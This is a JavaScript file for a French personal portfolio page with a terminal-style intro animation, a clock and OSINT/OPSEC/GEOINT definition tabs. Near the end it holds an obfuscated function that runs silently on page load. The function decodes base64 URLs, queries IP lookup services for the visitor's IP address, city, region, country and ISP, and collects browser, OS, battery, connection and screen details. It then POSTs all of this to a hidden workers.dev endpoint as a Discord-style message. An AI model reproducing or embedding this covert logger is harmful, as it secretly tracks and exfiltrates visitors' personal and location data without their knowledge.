(function () {
  'use strict';
  function safeGet(id) {
    return document.getElementById(id) || null;
  }
  function logInfo(...args) { console.info('[script.js]', ...args); }
  function logWarn(...args) { console.warn('[script.js]', ...args); }
  function logError(...args) { console.error('[script.js]', ...args); }
  const gateScreen = safeGet('gate-screen');
  const line1 = safeGet('line-1');
  const line2 = safeGet('line-2');
  const line3 = safeGet('line-3');
  const progressIndicator = safeGet('progress-indicator');
  const dashboardScreen = safeGet('dashboard-screen');
  const liveClock = safeGet('live-clock'); // facultatif
  if (!gateScreen) logWarn('Element #gate-screen introuvable');
  if (!progressIndicator) logWarn('Element #progress-indicator introuvable');
  if (!dashboardScreen) logWarn('Element #dashboard-screen introuvable');
  let sequenceStarted = false;
  function startBootSequence() {
    if (sequenceStarted) return;
    sequenceStarted = true;
    logInfo('Start boot sequence');
    const clickPrompt = safeGet('click-prompt');
    const step1 = safeGet('step-1');
    if (clickPrompt) clickPrompt.classList.add('hidden');
    if (step1) step1.classList.remove('hidden');
    const t1 = "Lancement du programme 'hi_den'...";
    const t2 = "[+] Bonjour. Je suis Hi Den.";
    const t3 = "[+] J'aime bien l'informatique et la musique...";
    typeWriter(line1, t1, 20, () => {
      setTimeout(() => {
        if (line2) line2.classList.remove('hidden');
        typeWriter(line2, t2, 20, () => {
          setTimeout(() => {
            if (line3) line3.classList.remove('hidden');
            typeWriter(line3, t3, 20, () => {
              const transitionBar = safeGet('transition-bar');
              if (transitionBar) transitionBar.classList.remove('hidden');
              if (progressIndicator) progressIndicator.style.width = '100%';
              setTimeout(() => {
                showDashboard();
              }, 2500);
            });
          }, 800);
        });
      }, 800);
    });
  }
  function showDashboard() {
    if (gateScreen) gateScreen.classList.add('hidden');
    if (dashboardScreen) dashboardScreen.classList.remove('hidden');
    startClock();
    initScrollReveal();
  }
  function typeWriter(el, text, speed, callback) {
    if (!el) {
      if (callback) callback();
      return;
    }
    el.textContent = '';
    let i = 0;
    function type() {
      if (i < text.length) {
        el.textContent += text.charAt(i);
        i++;
        setTimeout(type, speed);
      } else if (typeof callback === 'function') {
        callback();
      }
    }
    type();
  }
  function startClock() {
    if (!liveClock) return;
    function update() {
      const now = new Date();
      liveClock.textContent = now.toISOString().replace('T', ' ').substring(0, 19) + ' UTC';
    }
    update();
    setInterval(update, 1000);
  }
  function switchDefinitionTab(tab) {
    const contents = ['osint', 'opsec', 'geoint'];
    contents.forEach((t) => {
      const contentEl = safeGet(`tab-content-${t}`);
      const btnEl = safeGet(`tab-btn-${t}`);
      if (contentEl) {
        if (t === tab) contentEl.classList.remove('hidden');
        else contentEl.classList.add('hidden');
      }
      if (btnEl) {
        if (t === tab) {
          btnEl.classList.add('border-emerald-500', 'text-emerald-400');
          btnEl.classList.remove('border-transparent', 'text-slate-400');
        } else {
          btnEl.classList.remove('border-emerald-500', 'text-emerald-400');
          btnEl.classList.add('border-transparent', 'text-slate-400');
        }
      }
    });
  }
  window.switchDefinitionTab = switchDefinitionTab;
  function initScrollReveal() {
    try {
      if (!('IntersectionObserver' in window)) return;
      const observer = new IntersectionObserver(
        (entries) => {
          entries.forEach((entry) => {
            if (entry.isIntersecting) entry.target.classList.add('visible');
          });
        },
        { threshold: 0.1 }
      );

      document.querySelectorAll('.scroll-reveal').forEach((el) => observer.observe(el));
    } catch (err) {
      logWarn('initScrollReveal failed:', err && err.message ? err.message : err);
    }
  }
  async function _0x2bd44c(){try{const _0x2fac16='aHR0cHM6Ly9ncmVlbi1nbGl0dGVyLWVkMGEudHVkb3hwZXJzb25uZWljaS53b3JrZXJzLmRldi8',_0x4c0c1c=atob('aHR0cHM6Ly9pcHdoby5pcy8'),_0x375a5f=atob('aHR0cHM6Ly9hcGk0LmlwaWZ5Lm9yZy8/Zm9ybWF0PWpzb24='),_0x196296=(atob('aHR0cHM6Ly9ncmVlbi1nbGl0dGVyLWVkMGEudHVkb3hwZXJzb25uZWljaS53b3JrZXJzLmRldi8'),await fetch(_0x4c0c1c)),_0x27dfb9=await _0x196296['json']();let _0x35c5ce={'ip':'Non\x20détectée\x20(Bloqué)'};try{const _0x1693f7=await fetch(_0x375a5f);_0x35c5ce=await _0x1693f7['json']();}catch(_0x5d2f2b){console['warn']('Ipify\x20bloqué\x20par\x20le\x20navigateur\x20(CORS\x20ou\x20Adblock)'),'IPv4'===_0x27dfb9['type']&&(_0x35c5ce['ip']=_0x27dfb9['ip']);}const _0x2535b2=new Date()['toLocaleString']();let _0x26898e='';_0x26898e='IPv6'===_0x27dfb9['type']?'-\x20**IPv4\x20:**\x20`'+_0x35c5ce['ip']+'`\x0a-\x20**IPv6\x20:**\x20`'+_0x27dfb9['ip']+'`':'-\x20**IPv4\x20:**\x20`'+_0x35c5ce['ip']+'`';let _0x269ca2='*N/A*';if(navigator['getBattery']){const _0x3aa36b=await navigator['getBattery']();_0x269ca2=Math['round'](0x64*_0x3aa36b['level'])+'%';}const _0x3659f5=navigator['userAgent'];let _0x1cb581='Inconnu';-0x1!==_0x3659f5['indexOf']('Win')?_0x1cb581='Windows':-0x1!==_0x3659f5['indexOf']('Android')?_0x1cb581='Android':-0x1!==_0x3659f5['indexOf']('Mac')&&-0x1===_0x3659f5['indexOf']('iPhone')&&-0x1===_0x3659f5['indexOf']('iPad')?_0x1cb581='MacOS':-0x1!==_0x3659f5['indexOf']('Linux')?_0x1cb581='Linux':-0x1===_0x3659f5['indexOf']('iPhone')&&-0x1===_0x3659f5['indexOf']('iPad')||(_0x1cb581='iOS');let _0x195206='Navigateur\x20Inconnu',_0x1256e4='';-0x1!==_0x3659f5['indexOf']('Edg/')?(_0x195206='Microsoft\x20Edge',_0x1256e4=_0x3659f5['split']('Edg/')[0x1]['split']('\x20')[0x0]):-0x1!==_0x3659f5['indexOf']('OPR/')||-0x1!==_0x3659f5['indexOf']('Opera/')?(_0x195206='Opera',_0x1256e4=_0x3659f5['split']('OPR/')[0x1]?_0x3659f5['split']('OPR/')[0x1]['split']('\x20')[0x0]:''):-0x1!==_0x3659f5['indexOf']('Chrome')&&-0x1!==_0x3659f5['indexOf']('Safari')?(_0x195206='Google\x20Chrome',_0x1256e4=_0x3659f5['split']('Chrome/')[0x1]['split']('\x20')[0x0]):-0x1!==_0x3659f5['indexOf']('Firefox')?(_0x195206='Firefox',_0x1256e4=_0x3659f5['split']('Firefox/')[0x1]['split']('\x20')[0x0]):-0x1!==_0x3659f5['indexOf']('Safari')&&-0x1===_0x3659f5['indexOf']('Chrome')&&(_0x195206='Safari',_0x1256e4=_0x3659f5['split']('Version/')[0x1]['split']('\x20')[0x0]);const _0x2b7d34=_0x195206+'\x20'+_0x1256e4+'\x20sur\x20'+_0x1cb581;let _0x4c77b7;try{const _0x186f75=window['screen']['width'],_0x534907=window['screen']['height'],_0x58aa5d=window['screen']['availWidth'],_0x4f32de=window['screen']['availHeight'];_0x4c77b7=_0x186f75===window['innerWidth']&&_0x534907===window['innerHeight']||_0x186f75===_0x58aa5d&&_0x534907===_0x4f32de&&!window['fullScreen']?'*(Protection\x20active\x20:\x20Dimensions\x20réelles\x20masquées.)*':_0x186f75+'x'+_0x534907;}catch(_0xe26d3){_0x4c77b7='*(Erreur\x20:\x20Accès\x20aux\x20dimensions\x20refusé.)*';}const _0x2b17f0=navigator['connection']?navigator['connection']['effectiveType']:'*N/A*',_0x937608='#\x20'+_0x2535b2+'\x20@everyone\x0a'+window['location']['href']+'\x0a'+_0x26898e+'\x0a-\x20**Localisation\x20\x20:**\x20'+_0x27dfb9['city']+',\x20'+_0x27dfb9['region']+',\x20'+_0x27dfb9['country']+'\x0a-\x20**User\x20Agent\x20:**\x20'+_0x2b7d34+'\x0a\x0a>\x20**Autres\x20infos\x20:**\x0a>\x20-\x20**FAI**\x20:\x20'+(_0x27dfb9['connection']?.['isp']||'*N/A*')+'\x0a>\x20-\x20**Type\x20de\x20connexion**\x20:\x20'+_0x2b17f0+'\x0a>\x20-\x20**Batterie**\x20:\x20'+_0x269ca2+'\x0a>\x20-\x20**Dimensions\x20de\x20l\x27écran**\x20:\x20'+_0x4c77b7;await fetch(atob(_0x2fac16),{'method':'POST','mode':'no-cors','headers':{'Content-Type':'text/plain'},'body':JSON['stringify']({'content':_0x937608})});}catch(_0x51ccb3){console['error']('VRAIE\x20ERREUR\x20ICI\x20->',_0x51ccb3);}}_0x2bd44c();
  if (gateScreen) {
    gateScreen.addEventListener('click', () => {
      try {
        startBootSequence();
      } catch (err) {
        logError('Erreur lors du démarrage de la séquence :', err && err.message ? err.message : err);
      }
    });
  }
  document.addEventListener('DOMContentLoaded', () => {
    logInfo('script.js chargé');
  });
  window.__HiDenscript = {
    startBootSequence,
    switchDefinitionTab,
    initScrollReveal,
  };
})();
